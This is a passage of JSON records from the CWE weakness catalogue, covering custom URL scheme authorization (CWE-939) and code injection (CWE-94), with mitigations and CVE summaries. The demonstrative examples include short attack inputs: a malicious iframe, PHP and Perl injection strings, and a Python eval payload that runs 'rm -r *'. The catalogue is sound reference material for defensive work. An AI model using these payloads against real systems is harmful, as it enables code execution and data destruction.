the URL path. This flaw allows an attacker to input a crafted URL, leading to injection attacks. This flaw affects Python versions prior to 3.10.0b1, 3.9.5, 3.8.11, 3.7.11 and 3.6.14."}, {"Reference": "CVE-2022-25420", "Description": "NTT Resonant Incorporated goo blog App Web Application 1.0 is vulnerable to CLRF injection. This vulnerability allows attackers to execute arbitrary code via a crafted HTTP request."}, {"Reference": "CVE-2022-29166", "Description": "matrix-appservice-irc is a Node.js IRC bridge for Matrix. The vulnerability in node-irc allows an attacker to manipulate a Matrix user into executing IRC commands by having them reply to a maliciously crafted message. The vulnerability has been patched in matrix-appservice-irc 0.33.2. Refrain from replying to messages from untrusted participants in IRC-bridged Matrix rooms. There are no known workarounds for this issue."}, {"Reference": "CVE-2022-35948", "Description": "undici is an HTTP/1.1 client, written from scratch for Node.js.`=< undici@5.8.0` users are vulnerable to _CRLF Injection_ on headers when using unsanitized input as request headers, more specifically, inside the `content-type` header. Example: ``` import { request } from 'undici' const unsanitizedContentTypeInput = 'application/json\\\\r\\\\n\\\\r\\\\nGET /foo2 HTTP/1.1' await request('http://localhost:3000, { method: 'GET', headers: { 'content-type': unsanitizedContentTypeInput }, }) ``` The above snippet will perform two requests in a single `request` API call: 1) `http://localhost:3000/` 2) `http://localhost:3000/foo2` This issue was patched in Undici v5.8.1. Sanitize input when sending content-type headers using user input as a workaround."}, {"Reference": "CVE-2022-4768", "Description": "A vulnerability was found in Dropbox merou. It has been classified as critical. Affected is the function add_public_key of the file grouper/public_key.py of the component SSH Public Key Handler. The manipulation of the argument public_key_str leads to injection. It is possible to launch the attack remotely. The name of the patch is d93087973afa26bc0a2d0a5eb5c0fde748bdd107. It is recommended to apply a patch to fix this issue. VDB-216906 is the identifier assigned to this vulnerability."}, {"Reference": "CVE-2022-24838", "Description": "Nextcloud Calendar is a calendar application for the nextcloud framework. SMTP Command Injection in Appointment Emails via Newlines: as newlines and special characters are not sanitized in the email value in the JSON request, a malicious attacker can inject newlines to break out of the `RCPT TO:<BOOKING USER'S EMAIL> ` SMTP command and begin injecting arbitrary SMTP commands. It is recommended that Calendar is upgraded to 3.2.2. There are no workaround available."}, {"Reference": "CVE-2022-2992", "Description": "A vulnerability in GitLab CE/EE affecting all versions from 11.10 prior to 15.1.6, 15.2 to 15.2.4, 15.3 to 15.3.2 allows an authenticated user to achieve remote code execution via the Import from GitHub API endpoint."}, {"Reference": "CVE-2022-42544", "Description": "In getView of AddAppNetworksFragment.java, there is a possible way to mislead the user about network add requests due to improper input validation. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-224545390"}]}
{"ID": "939", "Name": "Improper Authorization in Handler for Custom URL Scheme", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product uses a handler for a custom URL scheme, but it does not properly restrict which actors can invoke the handler using the scheme.", "ExtendedDescription": "Mobile platforms and other architectures allow the use of custom URL schemes to facilitate communication between applications. In the case of iOS, this is the only method to do inter-application communication. The implementation is at the developer's discretion which may open security flaws in the application. An example could be potentially dangerous functionality such as modifying files through a custom URL scheme.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "862", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Technology", "Class": "Mobile", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation", "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Description": "\n\nUtilize a user prompt pop-up to authorize potentially harmful actions such as those modifying data or dealing with sensitive information.\n\n\nWhen designing functionality of actions in the URL scheme, consider whether the action should be accessible to all mobile applications, or if an allowlist of applications to interface with is appropriate.\n"}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "This iOS application uses a custom URL scheme. The replaceFileText action in the URL scheme allows an external application to interface with the file incomingMessage.txt and replace the contents with the text field of the query string."}, {"BodyText": "External Application"}, {"Nature": "Good", "Language": "Objective-C", "ExampleCode": "```\n\tNSString *stringURL = @\"appscheme://replaceFileText?file=incomingMessage.txt&text=hello\";\n\tNSURL *url = [NSURL URLWithString:stringURL];\n\t[[UIApplication sharedApplication] openURL:url];\n```"}, {"BodyText": "Application URL Handler"}, {"Nature": "Bad", "ExampleCode": "```\n\t- (BOOL)application:(UIApplication *)application handleOpenURL:(NSURL *)url {\n\t\tif (!url) {\n\t\t\treturn NO;\n\t\t}\n\t\tNSString *action = [url host];\n\t\tif([action isEqualToString: @\"replaceFileText\"]) {\n\t\t\tNSDictionary *dict = [self parseQueryStringExampleFunction:[url query]];\n```\n//this function will write contents to a specified file* \n\t\t\tFileObject *objectFile = [self writeToFile:[dict objectForKey: @\"file\"] withText:[dict objectForKey: @\"text\"]];}\n\t\treturn YES;}"}, {"BodyText": "The handler has no restriction on who can use its functionality. The handler can be invoked using any method that invokes the URL handler such as the following malicious iframe embedded on a web page opened by Safari."}, {"Nature": "Attack", "Language": "HTML", "ExampleCode": "```\n\t<iframe src=\"appscheme://replaceFileText?file=Bookmarks.dat&text=listOfMaliciousWebsites\">\n```"}, {"BodyText": "The attacker can host a malicious website containing the iframe and trick users into going to the site via a crafted phishing email. Since Safari automatically executes iframes, the user is not prompted when the handler executes the iframe code which automatically invokes the URL handler replacing the bookmarks file with a list of malicious websites. Since replaceFileText is a potentially dangerous action, an action that modifies data, there should be a sanity check before the writeToFile:withText: function."}]}, {"ID": "DX-109", "Entries": [{"IntroText": "These Android and iOS applications intercept URL loading within a WebView and perform special actions if a particular URL scheme is used, thus allowing the Javascript within the WebView to communicate with the application:"}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n```\n// Android* \n\t@Override\n\tpublic boolean shouldOverrideUrlLoading(WebView view, String url){\n\t```\n\t\t\tif (url.substring(0,14).equalsIgnoreCase(\"examplescheme:\")){\n\t\t\t\tif(url.substring(14,25).equalsIgnoreCase(\"getUserInfo\")){\n\t\t\t\t\twriteDataToView(view, UserData);\n\t\t\t\t\treturn false;\n\t\t\t\t}\n\t\t\t\telse{\n\t\t\t\t\treturn true;\n\t\t\t\t}\n\t\t\t}\n\t}\n```"}, {"Nature": "Bad", "Language": "Objective-C", "ExampleCode": "```\n```\n// iOS* \n\t-(BOOL) webView:(UIWebView *)exWebView shouldStartLoadWithRequest:(NSURLRequest *)exRequest navigationType:(UIWebViewNavigationType)exNavigationType\n\t{\n\t```\n\t\t\tNSURL *URL = [exRequest URL];\n\t\t\tif ([[URL scheme] isEqualToString:@\"exampleScheme\"])\n\t\t\t{\n\t\t\t\t\tNSString *functionString = [URL resourceSpecifier];\n\t\t\t\t\tif ([functionString hasPrefix:@\"specialFunction\"])\n\t\t\t\t\t{\n```\n// Make data available back in webview.* \n\t\t\t\t\t\t\tUIWebView *webView = [self writeDataToView:[URL query]];}\n\t\t\t\t\treturn NO;}\n\t\t\treturn YES;}"}, {"BodyText": "A call into native code can then be initiated by passing parameters within the URL:"}, {"Nature": "Attack", "Language": "JavaScript", "ExampleCode": "```\n\twindow.location = examplescheme://method?parameter=value\n```"}, {"BodyText": "Because the application does not check the source, a malicious website loaded within this WebView has the same access to the API as a trusted site."}]}], "ObservedExamples": [{"Reference": "CVE-2013-5725", "Description": "URL scheme has action replace which requires no user prompt and allows remote attackers to perform undesired actions.", "Link": "https://www.cve.org/CVERecord?id=CVE-2013-5725"}, {"Reference": "CVE-2013-5726", "Description": "URL scheme has action follow and favorite which allows remote attackers to force user to perform undesired actions.", "Link": "https://www.cve.org/CVERecord?id=CVE-2013-5726"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2022-20736", "Description": "A vulnerability in the web-based management interface of Cisco AppDynamics Controller Software could allow an unauthenticated, remote attacker to access a configuration file and the login page for an administrative console that they would not normally have authorization to access. This vulnerability is due to improper authorization checking for HTTP requests that are submitted to the affected web-based management interface. An attacker could exploit this vulnerability by sending a crafted HTTP request to an affected instance of AppDynamics Controller. A successful exploit could allow the attacker to access the login page for an administrative console. AppDynamics has released software updates that address this vulnerability."}, {"Reference": "CVE-2022-41797", "Description": "Improper authorization in handler for custom URL scheme vulnerability in Lemon8 App for Android versions prior to 3.3.5 and Lemon8 App for iOS versions prior to 3.3.5 allows a remote attacker to lead a user to access an arbitrary website via the vulnerable App. As a result, the user may become a victim of a phishing attack."}]}
{"ID": "94", "Name": "Improper Control of Generation of Code ('Code Injection')", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment.", "ExtendedDescription": "\n\nWhen a product allows a user's input to contain code syntax, it might be possible for an attacker to craft the code in such a way that it will alter the intended control flow of the product. Such an alteration could lead to arbitrary code execution.\n\n\nInjection problems encompass a wide variety of issues -- all mitigated in very different ways. For this reason, the most effective way to discuss these weaknesses is to note the distinct features which classify them as injection weaknesses. The most important issue to note is that all injection problems share one thing in common -- i.e., they allow for the injection of control plane data into the user-controlled data plane. This means that the execution of the process may be altered by sending code in through legitimate data channels, using no other mechanism. While buffer overflows, and many other flaws, involve the use of some further issue to gain execution, injection problems need only for the data to be parsed. The most classic instantiations of this category of weakness are SQL injection and format string vulnerabilities.\n", "LikelihoodOfExploit": "Medium", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "74", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "74", "ViewID": "1003", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "913", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Interpreted", "Prevalence": "Sometimes"}, {"Type": "Technology", "Name": "AI/ML", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation", "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."}], "CommonConsequences": [{"Scope": ["Access Control"], "Impact": ["Bypass Protection Mechanism"], "Note": "In some cases, injectable code controls authentication; this may lead to a remote vulnerability."}, {"Scope": ["Access Control"], "Impact": ["Gain Privileges or Assume Identity"], "Note": "Injected code can access resources that the attacker is directly prevented from accessing."}, {"Scope": ["Integrity", "Confidentiality", "Availability"], "Impact": ["Execute Unauthorized Code or Commands"], "Note": "Code injection attacks can lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing. Additionally, code injection can often result in the execution of arbitrary code."}, {"Scope": ["Non-Repudiation"], "Impact": ["Hide Activities"], "Note": "Often the actions performed by injected control code are unlogged."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Description": "Refactor your program so that you do not have to dynamically generate code."}, {"Phase": ["Architecture and Design"], "Description": "\n\nRun your code in a \"jail\" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which code can be executed by your product.\n\n\nExamples include the Unix chroot jail and AppArmor. In general, managed code may provide some protection.\n\n\nThis may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise.\n\n\nBe careful to avoid CWE-243 and other weaknesses related to jails.\n"}, {"MitigationID": "MIT-5", "Phase": ["Implementation"], "Strategy": "Input Validation", "Description": "\n\nAssume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.\n\n\nWhen performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"\n\n\nDo not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.\n\n\nTo reduce the likelihood of code injection, use stringent allowlists that limit which constructs are allowed. If you are dynamically constructing code that invokes a function, then verifying that the input is alphanumeric might be insufficient. An attacker might still be able to reference a dangerous function that you did not intend to allow, such as system(), exec(), or exit().\n"}, {"Phase": ["Testing"], "Description": "Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible."}, {"Phase": ["Testing"], "Description": "Use dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results."}, {"MitigationID": "MIT-32", "Phase": ["Operation"], "Strategy": "Compilation or Build Hardening", "Description": "Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's \"-T\" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184)."}, {"MitigationID": "MIT-32", "Phase": ["Operation"], "Strategy": "Environment Hardening", "Description": "Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's \"-T\" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184)."}, {"Phase": ["Implementation"], "Description": "\n\nFor Python programs, it is frequently encouraged to use the ast.literal_eval() function instead of eval, since it is intentionally designed to avoid executing code. However, an adversary could still cause excessive memory or stack consumption via deeply nested structures [REF-1372], so the python documentation discourages use of ast.literal_eval() on untrusted data [REF-1373].\n", "Effectiveness": "Discouraged Common Practice"}], "DemonstrativeExamples": [{"ID": "DX-32", "Entries": [{"IntroText": "This example attempts to write user messages to a message file and allow users to view them."}, {"Nature": "Bad", "Language": "PHP", "ExampleCode": "```\n\t$MessageFile = \"messages.out\";\n\tif ($_GET[\"action\"] == \"NewMessage\") {\n\t\t$name = $_GET[\"name\"];\n\t\t$message = $_GET[\"message\"];\n\t\t$handle = fopen($MessageFile, \"a+\");\n\t\tfwrite($handle, \"<b>$name</b> says '$message'<hr>\\n\");\n\t\tfclose($handle);\n\t\techo \"Message Saved!<p>\\n\";\n\t}\n\telse if ($_GET[\"action\"] == \"ViewMessages\") {\n\t\tinclude($MessageFile);\n\t}\n```"}, {"BodyText": "While the programmer intends for the MessageFile to only include data, an attacker can provide a message such as:"}, {"Nature": "Attack", "ExampleCode": "```\n\tname=h4x0r\n\tmessage=%3C?php%20system(%22/bin/ls%20-l%22);?%3E\n```"}, {"BodyText": "which will decode to the following:"}, {"Nature": "Attack", "ExampleCode": "```\n\t<?php system(\"/bin/ls -l\");?>\n```"}, {"BodyText": "The programmer thought they were just including the contents of a regular data file, but PHP parsed it and executed the code. Now, this code is executed any time people view messages."}, {"BodyText": "Notice that XSS (CWE-79) is also possible in this situation."}]}, {"ID": "DX-31", "Entries": [{"IntroText": "edit-config.pl: This CGI script is used to modify settings in a configuration file."}, {"Nature": "Bad", "Language": "Perl", "ExampleCode": "```\n\tuse CGI qw(:standard);\n\tsub config_file_add_key {\n\t\t\tmy ($fname, $key, $arg) = @_;\n```\n# code to add a field/key to a file goes here* \n\t\t\t}\n\t\n\tsub config_file_set_key {\n\t```\n\t\t\tmy ($fname, $key, $arg) = @_;\n```\n# code to set key to a particular file goes here* \n\t\t\t}\n\t\n\tsub config_file_delete_key {\n\t```\n\t\t\tmy ($fname, $key, $arg) = @_;\n```\n# code to delete key from a particular file goes here* \n\t\t\t}\n\t\n\tsub handleConfigAction {\n\t```\n\t\t\tmy ($fname, $action) = @_;\n\t\t\tmy $key = param('key');\n\t\t\tmy $val = param('val');\n```\n# this is super-efficient code, especially if you have to invoke* \n\t\t\t\n\t\t\t\n\t\t\t\n\t\t\t *# any one of dozens of different functions!* \n\t\t\t\n\t\t\tmy $code = \"config_file_$action_key(\\$fname, \\$key, \\$val);\";\n\t\t\teval($code);}\n\t\n\t$configfile = \"/home/cwe/config.txt\";\n\tprint header;\n\tif (defined(param('action'))) {\n\t```\n\t\thandleConfigAction($configfile, param('action'));\n\t}\n\telse {\n\t\tprint \"No action specified!\\n\";\n\t}\n```"}, {"BodyText": "The script intends to take the 'action' parameter and invoke one of a variety of functions based on the value of that parameter - config_file_add_key(), config_file_set_key(), or config_file_delete_key(). It could set up a conditional to invoke each function separately, but eval() is a powerful way of doing the same thing in fewer lines of code, especially when a large number of functions or variables are involved. Unfortunately, in this case, the attacker can provide other values in the action parameter, such as:"}, {"Nature": "Attack", "ExampleCode": "```\n\tadd_key(\",\",\"); system(\"/bin/ls\");\n```"}, {"BodyText": "This would produce the following string in handleConfigAction():"}, {"Nature": "Result", "ExampleCode": "```\n\tconfig_file_add_key(\",\",\"); system(\"/bin/ls\");\n```"}, {"BodyText": "Any arbitrary Perl code could be added after the attacker has \"closed off\" the construction of the original function call, in order to prevent parsing errors from causing the malicious eval() to fail before the attacker's payload is activated. This particular manipulation would fail after the system() call, because the \"_key(\\$fname, \\$key, \\$val)\" portion of the string would cause an error, but this is irrelevant to the attack because the payload has already been activated."}]}, {"ID": "DX-156", "Entries": [{"IntroText": "This simple script asks a user to supply a list of numbers as input and adds them together."}, {"Nature": "Bad", "Language": "Python", "ExampleCode": "```\n\t def main():\n\t\t sum = 0\n\t\t numbers = eval(input(\"Enter a space-separated list of numbers: \"))\n\t\t for num in numbers:\n\t\t\t sum = sum + num\n\t\t print(f\"Sum of {numbers} = {sum}\") \n\t main() \n```"}, {"BodyText": "The eval() function can take the user-supplied list and convert it into a Python list object, therefore allowing the programmer to use list comprehension methods to work with the data. However, if code is supplied to the eval() function, it will execute that code. For example, a malicious user could supply the following string:"}, {"Nature": "Attack", "ExampleCode": "```\n\t__import__('subprocess').getoutput('rm -r *')\n```"}, {"BodyText": "This would delete all the files in the current directory. For this reason, it is not recommended to use eval() with untrusted input."}, {"BodyText": "A way to accomplish this without the use of eval() is to apply an integer conversion on the input within a try/except block. If the user-supplied input is not numeric, this will raise a ValueError. By avoiding eval(), there is no opportunity for the input string to be executed as code."}, {"Nature": "Good", "Language": "Python", "ExampleCode": "```\n\t def main():\n\t\t sum = 0\n\t\t numbers = input(\"Enter a space-separated list of numbers: \").split(\" \")\n\t\t try:\n\t\t\t for num in numbers:\n\t\t\t\t sum = sum + int(num)\n\t\t\t print(f\"Sum of {numbers} = {sum}\") \n\t\t except ValueError:\n\t\t\t print(\"Error: invalid input\")\n\t main() \n```"}, {"BodyText": "An alternative, commonly-cited mitigation for this kind of weakness is to use the ast.literal_eval() function, since it is intentionally designed to avoid executing code. However, an adversary could still cause excessive memory or stack consumption via deeply nested structures [REF-1372], so the python documentation discourages use of ast.literal_eval() on untrusted data [REF-1373]."}]}], "ObservedExamples": [{"Reference": "CVE-2023-29374", "Description": "Math component in an LLM framework translates user input into a Python expression that is input into the Python exec() method, allowing code execution - one variant of a \"prompt injection\" attack.", "Link": "https://www.cve.org/CVERecord?id=CVE-2023-29374"}, {"Reference": "CVE-2024-5565", "Description": "Python-based library uses an LLM prompt containing user input to dynamically generate code that is then fed as input into the Python exec() method, allowing code execution - one variant of a \"prompt injection\" attack.", "Link": "https://www.cve.org/CVERecord?id=CVE-2024-5565"}, {"Reference": "CVE-2024-4181", "Description": "Framework for LLM applications allows eval injection via a crafted response from a hosting provider.", "Link": "https://www.cve.org/CVERecord?id=CVE-2024-4181"}, {"Reference": "CVE-2022-2054", "Description": "Python compiler uses eval() to execute malicious strings as Python code.", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-2054"}, {"Reference": "CVE-2021-22204", "Description": "Chain: regex in EXIF processor code does not correctly determine where a string ends (CWE-625), enabling eval injection (CWE-95), as exploited in the wild per CISA KEV.", "Link": "https://www.cve.org/CVERecord?id=CVE-2021-22204"}, {"Reference": "CVE-2020-8218", "Description": "\"Code injection\" in VPN product, as exploited in the wild per CISA KEV.", "Link": "https://www.cve.org/CVERecord?id=CVE-2020-8218"}, {"Reference": "CVE-2008-5071", "Description": "Eval injection in PHP program.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5071"}, {"Reference": "CVE-2002-1750", "Description": "Eval injection in Perl program.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1750"}, {"Reference": "CVE-2008-5305", "Description": "Eval injection in Perl program using an ID that should only contain hyphens and numbers.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5305"}, {"Reference": "CVE-2002-1752", "Description": "Direct code injection into Perl eval function.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1752"}, {"Reference": "CVE-2002-1753", "Description": "Eval injection in Perl program.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1753"}, {"Reference": "CVE-2005-1527", "Description": "Direct code injection into Perl eval function.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1527"}, {"Reference": "CVE-2005-2837", "Description": "Direct code injection into Perl eval function.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2837"}, {"Reference": "CVE-2005-1921", "Description": "MFV. code injection into PHP eval statement using nested constructs that should not be nested.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1921"}, {"Reference": "CVE-2005-2498", "Description": "MFV. code injection into PHP eval statement using nested constructs that should not be nested.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2498"}, {"Reference": "CVE-2005-3302", "Description": "Code injection into Python eval statement from a field in a formatted file.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3302"}, {"Reference": "CVE-2007-1253", "Description": "Eval injection in Python program.", "Link": "https://www.cve.org/CVERecord?id=CVE-2007-1253"}, {"Reference": "CVE-2001-1471", "Description": "chain: Resultant eval injection. An invalid value prevents initialization of variables, which can be modified by attacker and later injected into PHP eval statement.", "Link": "https://www.cve.org/CVERecord?id=CVE-2001-1471"}, {"Reference": "CVE-2002-0495", "Description": "Perl code directly injected into CGI library file from parameters to another CGI program.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-0495"}, {"Reference": "CVE-2005-1876", "Description": "Direct PHP code injection into supporting template file.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1876"}, {"Reference": "CVE-2005-1894", "Description": "Direct code injection into PHP script that can be accessed by attacker.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1894"}, {"Reference": "CVE-2003-0395", "Description": "PHP code from User-Agent HTTP header directly inserted into log file implemented as PHP script.", "Link": "https://www.cve.org/CVERecord?id=CVE-2003-0395"}], "RelatedAttackPatterns": ["242", "35", "77"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2022-0661", "Description": "The Ad Injection WordPress plugin through 1.2.0.19 does not properly sanitize the body of the adverts injected into the pages, allowing a high privileged user (Admin+) to inject arbitrary HTML or javascript even with unfiltered_html disallowed, leading to a stored cross-site scripting (XSS) vulnerability. Further it is also possible to inject PHP code, leading to a Remote Code execution (RCE) vulnerability, even if the DISALLOW_FILE_EDIT and DISALLOW_FILE_MOD constants are both set."}, {"Reference": "CVE-2022-23614", "Description": "Twig is an open source template language for PHP. When in a sandbox mode, the `arrow` parameter of the `sort` filter must be a closure to avoid attackers being able to run arbitrary PHP functions. In affected versions this constraint was not properly enforced and could lead to code injection of arbitrary PHP code. Patched versions now disallow calling non Closure in the `sort` filter as is the case for some other filters. Users are advised to upgrade."}, {"Reference": "CVE-2022-25581", "Description": "Classcms v2.5 and below contains an arbitrary file upload via the component \\\\class\\\\classupload. This vulnerability allows attackers to execute code injection via a crafted .txt file."}, {"Reference": "CVE-2022-25760", "Description": "All versions of package accesslog are vulnerable to Arbitrary Code Injection due to the usage of the Function constructor without input sanitization. If (attacker-controlled) user input is given to the format option of the package's exported constructor function, it is possible for an attacker to execute arbitrary JavaScript code on the host that this package is being run on."}, {"Reference": "CVE-2022-29307", "Description": "IonizeCMS v1.0.8.1 was discovered to contain a command injection vulnerability via the function copy_lang_content in application/models/lang_model.php."}, {"Reference": "CVE-2022-3236", "Description": "A code injection vulnerability in the User Portal and Webadmin allows a remote attacker to execute code in Sophos Firewall version v19.0 MR1 and older."}, {"Reference": "CVE-2022-3401", "Description": "The Bricks theme for WordPress is vulnerable to remote code execution due to the theme allowing site editors to include executable code blocks in website content in versions 1.2 to 1.5.3. This, combined with the missing authorization vulnerability (CVE-2022-3400), makes it possible for authenticated attackers with minimal permissions, such as a subscriber, can edit any page, post, or template on the vulnerable WordPress website and inject a code execution block that can be used to achieve remote code execution."}, {"Reference": "CVE-2022-40145", "Description": "This vulnerable is about a potential code injection when an attacker has control of the target LDAP server using in the JDBC JNDI URL. The function jaas.modules.src.main.java.porg.apache.karaf.jass.modules.jdbc.JDBCUtils#doCreateDatasource use InitialContext.lookup(jndiName) without filtering. An user can modify `options.put(JDBCUtils.DATASOURCE, \"osgi:\" + DataSource.class.getName());` to `options.put(JDBCUtils.DATASOURCE,\"jndi:rmi://x.x.x.x:xxxx/Command\");` in JdbcLoginModuleTest#setup. This is vulnerable to a remote code execution (RCE) attack when a configuration uses a JNDI LDAP data source URI when an attacker has control of the target LDAP server.This issue affects all versions of Apache Karaf up to 4.4.1 and 4.3.7. We encourage the users to upgrade to Apache Karaf at least 4.4.2 or 4.3.8"}, {"Reference": "CVE-2022-41882", "Description": "The Nextcloud Desktop Client is a tool to synchronize files from Nextcloud Server with your computer. In version 3.6.0, if a user received a malicious file share and has it synced locally or the virtual filesystem enabled and clicked a nc://open/ link it will open the default editor for the file type of the shared file, which on Windows can also sometimes mean that a file depending on the type, e.g. \"vbs\", is being executed. It is recommended that the Nextcloud Desktop client is upgraded to version 3.6.1. As a workaround, users can block the Nextcloud Desktop client 3.6.0 by setting the `minimum.supported.desktop.version` system config to `3.6.1` on the server, so new files designed to use this attack vector are not downloaded anymore. Already existing files can still be used. Another workaround would be to enforce shares to be accepted by setting the `sharing.force_share_accept` system config to `true` on the server, so new files designed to use this attack vector are not downloaded anymore. Already existing shares can still be abused."}, {"Reference": "CVE-2022-38078", "Description": "Movable Type XMLRPC API provided by Six Apart Ltd. contains a command injection vulnerability. Sending a specially crafted message by POST method to Movable Type XMLRPC API may allow arbitrary Perl script execution, and an arbitrary OS command may be executed through it. Affected products and versions are as follows: Movable Type 7 r.5202 and earlier, Movable Type Advanced 7 r.5202 and earlier, Movable Type 6.8.6 and earlier, Movable Type Advanced 6.8.6 and earlier, Movable Type Premium 1.52 and earlier, and Movable Type Premium Advanced 1.52 and earlier. Note that all versions of Movable Type 4.0 or later including unsupported (End-of-Life, EOL) versions are also affected by this vulnerability."}, {"Reference": "CVE-2022-41223", "Description": "The Director database component of MiVoice Connect through 19.3 (22.22.6100.0) could allow an authenticated attacker to conduct a code-injection attack via crafted data due to insufficient restrictions on the database data type."}, {"Reference": "CVE-2021-22900", "Description": "A vulnerability allowed multiple unrestricted uploads in Pulse Connect Secure before 9.1R11.4 that could lead to an authenticated administrator to perform a file write via a maliciously crafted archive upload in the administrator web interface."}, {"Reference": "CVE-2022-22965", "Description": "A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding. The specific exploit requires the application to run on Tomcat as a WAR deployment. If the application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit. However, the nature of the vulnerability is more general, and there may be other ways to exploit it."}, {"Reference": "CVE-2022-29171", "Description": "Sourcegraph is a fast and featureful code search and navigation engine. Versions before 3.38.0 are vulnerable to Remote Code Execution in the gitserver service. The Gitolite code host integration with Phabricator allows Sourcegraph site admins to specify a `callsignCommand`, which is used to obtain the Phabricator metadata for a Gitolite repository. An administrator who is able to edit or add a Gitolite code host and has administrative access to Sourcegraph\u2019s bundled Grafana instance can change this command arbitrarily and run it remotely. This grants direct access to the infrastructure underlying the Sourcegraph installation. The attack requires: site-admin privileges on the instance of Sourcegraph, Administrative privileges on the bundled Grafana monitoring instance, Knowledge of the gitserver IP address or DNS name (if running in Kubernetes). This can be found through Grafana. The issue is patched in version 3.38.0. You may disable Gitolite code hosts. We still highly encourage upgrading regardless of workarounds."}, {"Reference": "CVE-2021-24942", "Description": "The Menu Item Visibility Control WordPress plugin through 0.5 doesn't sanitize and validate the \"Visibility logic\" option for WordPress menu items, which could allow highly privileged users to execute arbitrary PHP code even in a hardened environment."}, {"Reference": "CVE-2021-27446", "Description": "The Weintek cMT product line is vulnerable to code injection, which may allow an unauthenticated remote attacker to execute commands with root privileges on the operation system."}, {"Reference": "CVE-2021-39908", "Description": "In all versions of GitLab CE/EE starting from 0.8.0 before 14.2.6, all versions starting from 14.3 before 14.3.4, and all versions starting from 14.4 before 14.4.1 certain Unicode characters can be abused to commit malicious code into projects without being noticed in merge request or source code viewer UI."}, {"Reference": "CVE-2022-0885", "Description": "The Member Hero WordPress plugin through 1.0.9 lacks authorization checks, and does not validate the a request parameter in an AJAX action, allowing unauthenticated users to call arbitrary PHP functions with no arguments."}, 